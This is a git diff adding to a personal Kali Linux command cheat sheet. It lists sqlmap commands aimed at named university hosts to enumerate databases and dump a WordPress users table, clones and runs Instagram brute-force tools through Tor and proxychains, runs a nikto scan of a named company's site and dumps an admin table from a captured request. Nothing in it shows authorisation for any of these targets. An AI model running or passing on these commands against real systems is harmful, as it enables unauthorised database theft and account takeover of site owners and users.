@@ -16,3 +16,138 @@ chmod r+x filename // to force start a file when there's permisssion denied erro
   NETWORK CONFIGURATIONS - NMAP
 /////////////////////////////////////////////////////////////////////////////
 nmap -h
+
+
+
+/////////////////////////////////////////////////////////////////////////////
+      THC HYDRA 
+ /////////////////////////////////////////////////////////////////////////////
+ apt install man cewl
+ ##################################################################################################################
+ REFERENCE    REFERENCE    REFERENCE    REFERENCE    REFERENCE    REFERENCE    REFERENCE    REFERENCE    REFERENCE 
+ ##################################################################################################################
+----------------------------------------------------------
+ 	SQLMAP INSTALLATION
+----------------------------------------------------------
+sqlmap -o -u https://mmls.mmu.edu.my/ --forms --dbs
+sqlmap -o -u https://mmls.mmu.edu.my/ --forms -D Webapp --tables
+sqlmap -h
+sqlmap //to launch 
+sqlmap -u online.mmu.edu.my limit=5 action spAjaxResults&pollid=2" --dump -T wp_users -D wordpress 
+--threads=10 --random-agent --dbms=mysql --level=5 --risk=3
+----------------------------------------------------------
+	TOR INSTALLATION
+----------------------------------------------------------
+apt-get install tor
+apt-get update tor
+apt-get install git
+git clone https://github.com/thelinuxchoice/instainsane
+cd instainsane
+chmod +x instainsane.sh
+./instainsane.sh
+----------------------------------------------------------
+	PIP INSTALLATION
+----------------------------------------------------------
+apt-get install python3-pip
+apt-get install python-pip
+apt-get install python3-setuptools
+apt-get install python-setuptools
+pip -V //to check the installtion of python 2
+pip3 -V // to check the instalation of python 3
+
+git clone https://github.com/Ethical-H4CK3R/Instagram.git
+chmod -R 755 Instagram && cd Instagram
+----------------------------------------------------------
+----------------------------------------------------------
+
+
+
+sudo python3 get-pip.py
+----------------------------------------------------------
+nano ~/.bash aliases
+----------------------------------------------------------
+
+--------------------------
+new brurteforce
+----------------------------------------------------------
+git clone https://github.com/thelinuxchoice/instashell.git
+service tor start
+cd instashell/
+chmod 775 instashell.sh
+chmod 775 install.sh
+
+./instashell.sh
+sudo apt-get install proxychains
+
+
+----------------------------------------------------------
+BRUTE FORCE TRIAL 2 - USING PYTHON
+----------------------------------------------------------
+----------------------------------------------------------
+CLONING FROM MY OWN GITHUB INTO KALI
+----------------------------------------------------------
+----------------------------------------------------------
+ls HackerOne/
+cd HackerOne
+rm -r HackerOne // to delete git dir 
+git clone https://github.com/Perivitta/HackerOne.git
+
+sqlmap -r 12.txt --dbs --random-agent --thread 10
+sqlmap -r 12.txt -D level2  --tables --random-agent --thread 10
+sqlmap -r 12.txt -D level2  -T admin --dump-all --random-agent --thread 10
+sqlmap -r 12.txt -D level2  -Tpages --dump-all --random-agent --thread 10
+
+
+
+
+----------------------------------------------------------
+apt-get install figlet //name
+cd /etc/
+
+figlet "PERI"
+
+
+---------------------------------------------------------------
+
+sudo su
+apt-get install openvas
+openvas -start
+openvas -check -setup
+
+---------------------------------------------------------------
+sudo su
+git clone https://github.com/shawarkhanethicalhacker/D-TECT-1.git
+cd D-TECT-1/
+ chmod +x d-tect.py 
+ python ./d-tect.py 
+
+---------------------------------------------------------------
+
+sudo apt-get install ipcalc
+apt-get install nmap
+nikto -h https://www.rapyd.net/ -ssl
+
+ipcalc IP 
+nslookup www.rapdy
+nslookup address
+
+figlet -f big "PERI.R"
+showfigofonts
+nano /etc/bash.bashrc
+
+
+--------------------------
+certifications
+
+top
+route
+jobs
+
+
+
+
+
+
+
+
+
